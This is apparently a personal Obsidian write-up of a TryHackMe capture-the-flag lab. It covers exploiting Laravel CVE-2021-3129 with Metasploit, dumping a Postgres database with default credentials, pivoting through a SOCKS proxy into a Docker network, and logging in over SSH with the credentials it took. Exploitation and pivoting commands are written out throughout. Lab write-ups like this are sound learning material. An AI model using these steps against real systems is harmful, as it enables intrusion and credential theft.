---
creation date: December 24th 2022
last modified date: December 24th 2022
aliases: []
tags: #🎌
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #🎌  

# [[THM - [Day 9] Dock the halls]]  


# Resolution summary
- Text
- Text

## Improved skills
- skill 1
- skill 2

## Used tools
- [[nmap]]
- 

---

# Information Gathering
Scanned all TCP ports:
```bash
PORT      STATE    SERVICE
80/tcp    open     http
21241/tcp filtered unknown
```

Enumerated open TCP ports:
```bash
PORT      STATE  SERVICE VERSION
80/tcp    open   http    Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: Curabitur aliquet, libero id suscipit semper
21241/tcp closed unknown
```

Enumerated Docker container: `proxychains -q nmap -n -sT -Pn -p 22,80,443,5432 172.17.0.1`
```bash
PORT     STATE  SERVICE
22/tcp   open   ssh
80/tcp   open   http
443/tcp  closed https
5432/tcp closed postgresql
```

---

# Enumeration
## Port 80 (Apache)
### Laravel 8.26.1
- Located a CVE-2021-3129


---

# Exploitation
## RCE CVE-2021-3129
- Utilized Metasploit in order to execute this attack by searching for the exploit while in **msfconsole**.
	- Attack worked first try and got a shell open
	-  Upgraded the shell by backgrounding the app with `CTRL-Z`
		- `sessions -u -1` this will upgrade session 1
- After this we found `cat /var/www/.env` which indicates to a database we want to dump for credentials
	- Dumping it can be done with Metasploit
	1. While connected to the target machine we want to run `resolve webservice_database` this will show us the IP of the database
	2. Now we need to route traffic to this address so we background our session and run `route add 172.28.101.51/32 -1`
	3. Next is the dump which is done with msfconsole
		1. `use auxiliary/scanner/postgres/postgres_schemadump`
		2. `run postgres://postgres:postgres@172.28.101.51/postgres`
	4. Next is selecting a certain table from the dump
		1. `use auxiliary/admin/postgres/postgres_sql`
		2. `run postgres://postgres:postgres@172.28.101.51/postgres sql='select * from users'`
- Lastly we want to run a scan from the Docker container but since it doesn't have nmap we want to route a nmap scan to it
	1. Docker uses a hard coded IP of `172.17.0.1` so we add that to the route table of Metasploit
		1. `route add 172.17.0.1/32 -1`
	2.  Now we will start a **socks_proxy**
		1. `use auxiliary/server/socks_proxy`
		2. `run srvhost=127.0.0.1 srvport=9050 version=4a`
	3.  First we can check if the socks proxy is working with `curl --proxy socks4a://localhost:9050 http://172.17.0.1 -v` run from our attacking machine console
	4. Second is using [[proxychains]] in order to direct our nmap scan to run from the target docker container
		1. `proxychains -q nmap -n -sT -Pn -p 22,80,443,5432 172.17.0.1`
- Finally we find that we have both an SSH and http port open
	1. We located credentials for user Santa before from the database dump so we try those creds but we do so from the Docker container
	2. `use auxiliary/scanner/ssh/ssh_login`
	3. `run ssh://santa_username_here:santa_password_here@172.17.0.1`
	4. Open the session for the SSH connection and we found our flag


---

# Lateral Movement to user
## Local Enumeration


## Lateral Movement vector


---

# Privilege Escalation
## Local Enumeration


## Privilege Escalation vector


---

# Trophy & Loot

___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: December 24th 2022 (11:48 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
